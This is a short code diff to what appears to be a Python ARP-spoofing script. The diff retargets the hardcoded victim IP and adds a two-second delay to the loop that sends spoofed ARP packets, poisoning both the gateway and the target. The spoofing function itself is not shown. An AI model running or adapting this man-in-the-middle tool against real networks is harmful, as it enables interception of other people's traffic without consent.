@@ -101,7 +101,7 @@ if __name__ == '__main__':
     # print(get_mac('192.168.99.100')) 
     getDevice(address + '/' + slash)
 
-    target_ip = "192.168.99.100" # Enter your target IP
+    target_ip = "172.20.10.11" # Enter your target IP
     # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
 
@@ -117,7 +117,7 @@ if __name__ == '__main__':
             spoof(gateway_ip, target_ip) # cheat on switch to know I am target
             sent_packets_count = sent_packets_count + 2
             print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-            # time.sleep(0.5) # Waits for two seconds
+            time.sleep(2) # Waits for two seconds
     
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
